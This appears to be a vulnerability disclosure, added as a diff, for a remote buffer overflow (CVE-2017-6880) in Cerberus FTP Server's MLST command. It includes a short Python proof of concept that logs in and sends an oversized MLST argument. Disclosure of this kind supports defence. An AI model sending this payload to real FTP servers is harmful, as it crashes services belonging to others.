@@ -1,0 +1,50 @@
+[+] Title: Cerberus FTP Server 8.0.10.3 – 'MLST' Remote Buffer Overflow
+[+] Credits / Discovery: Nassim Asrir
+[+] Author Contact: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/
+[+] Author Company: Henceforth
+[+] CVE: CVE-2017-6880
+
+Vendor:
+===============
+
+https://www.cerberusftp.com/
+  
+ 
+Download:
+===========
+
+https://www.cerberusftp.com/files/CerberusInstall.exe (32-Bit)
+ 
+ 
+Vulnerability Type:
+===================
+
+Remote Buffer Overflow.
+
+
+issue:
+===================
+
+This problem happens when the Attacker send the bad char "A" in the command "MLST" (2047).
+ 
+POC:
+===================
+#Simple POC by Nassim Asrir from Henceforth.
+import socket
+bad_char = "A"*2047
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.1.81',21))
+s.recv(1024)
+s.send('USER nassim\r\n')
+s.recv(1024)
+s.send('PASS mypass\r\n')
+s.recv(1024)
+s.send('MLST ' + bad_char + '\r\n')
+s.close()
+
+https://gist.github.com/Nassim-Asrir/a1bb8479976d4bf6b7c0e63024a46cd6/archive/e76274496bf20a0d3ecbb4b2f6a408166808d03b.zip
+ 
+Tested on:
+=============== 
+
+Windows 7 Sp1 (64 Bit)
